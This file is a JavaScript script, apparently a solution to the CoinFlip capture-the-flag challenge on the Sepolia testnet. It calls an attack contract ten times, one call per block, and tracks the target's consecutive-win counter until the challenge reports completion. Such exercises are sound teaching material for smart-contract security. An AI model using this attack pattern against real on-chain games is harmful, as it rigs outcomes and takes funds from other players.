import { createWalletClient,createPublicClient,http } from "viem";
import { sepolia } from "viem/chains";
import { privateKeyToAccount } from "viem/accounts";

const ATTACK_ADDRESS = process.env.CoinFlipATTACK_ADDRESS
const COINFLIP_ADDRESS = process.env.CoinFlip_ADDRESS

const RPC_URL = process.env.sepolia_rpc
const PRIVATE_KEY = process.env.PRIVATE_KEY

// 攻击合约 ABI
  const attackABI = [
    {
      name: 'attack',
      type: 'function',
      stateMutability: 'nonpayable',
      inputs: [],
      outputs: []
    }
  ]

  // CoinFlip ABI
  const coinFlipABI = [
    {
      name: 'consecutiveWins',
      type: 'function',
      stateMutability: 'view',
      inputs: [],
      outputs: [{ type: 'uint256' }]
    }
  ]

  // 创建钱包客户端
  const account = privateKeyToAccount(PRIVATE_KEY)
  const publicClient = createPublicClient({
    chain: sepolia,
    transport: http(RPC_URL),
  })
  const walletClient = createWalletClient({
    account: account,
    chain: sepolia,
    transport: http(RPC_URL),
  })

// 等待新区块
  async function waitForNewBlock(currentBlock) {
    console.log(`Waiting for new block (current: ${currentBlock})...`)
    while (true) {
      const newBlock = await publicClient.getBlockNumber()
      if (newBlock > currentBlock) {
        console.log(`New block: ${newBlock}`)
        return newBlock
      }
      await new Promise(resolve => setTimeout(resolve, 1000))
    }
  }

  // 主攻击函数
  async function attackCoinFlip() {
    console.log('🎯 Starting CoinFlip Attack...\n')
    console.log(`Attack Contract: ${ATTACK_ADDRESS}`)
    console.log(`Target Contract: ${COINFLIP_ADDRESS}`)
    console.log(`Attacker: ${account.address}\n`)

    // 先检查当前 wins
    let currentWins = await publicClient.readContract({
      address: COINFLIP_ADDRESS,
      abi: coinFlipABI,
      functionName: 'consecutiveWins'
    })
    console.log(`Current consecutive wins: ${currentWins}`)

    if (currentWins >= 10n) {
      console.log('✅ Already completed! No need to attack.')
      return
    }

    for (let i = 1; i <= 10; i++) {
      // 再次检查，避免多余攻击
      currentWins = await publicClient.readContract({
        address: COINFLIP_ADDRESS,
        abi: coinFlipABI,
        functionName: 'consecutiveWins'
      })

      if (currentWins >= 10n) {
        console.log(`\n✅ Reached 10 wins! Stopping at attack ${i}`)
        break
      }

      console.log(`\n=== Attack ${i}/10 ===`)

      // 获取当前区块
      const currentBlock = await publicClient.getBlockNumber()
      console.log(`Current block: ${currentBlock}`)

      try {
        // 发起攻击
        const hash = await walletClient.writeContract({
          address: ATTACK_ADDRESS,
          abi: attackABI,
          functionName: 'attack'
        })

        console.log(`Transaction sent: ${hash}`)

        // 等待交易确认
        const receipt = await publicClient.waitForTransactionReceipt({ hash })
        console.log(`✅ Confirmed in block: ${receipt.blockNumber}`)

        // 检查当前连胜次数
        const wins = await publicClient.readContract({
          address: COINFLIP_ADDRESS,
          abi: coinFlipABI,
          functionName: 'consecutiveWins'
        })

        console.log(`Consecutive wins: ${wins}`)

        // 如果达到10，立即停止
        if (wins >= 10n) {
          console.log('\n🎉 Challenge completed!')
          break
        }

        // 如果还没完成，等待下一个区块
        if (i < 10) {
          await waitForNewBlock(receipt.blockNumber)
        }

      } catch (error) {
        console.error(`❌ Attack ${i} failed:`, error.message)
        break
      }
    }

    // 最终检查
    const finalWins = await publicClient.readContract({
      address: COINFLIP_ADDRESS,
      abi: coinFlipABI,
      functionName: 'consecutiveWins'
    })

    console.log(`\n🏆 Final consecutive wins: ${finalWins}`)
    console.log(finalWins >= 10n ? '✅ Challenge completed!' : '❌ Challenge failed')
  }

  // 运行
  attackCoinFlip().catch(console.error)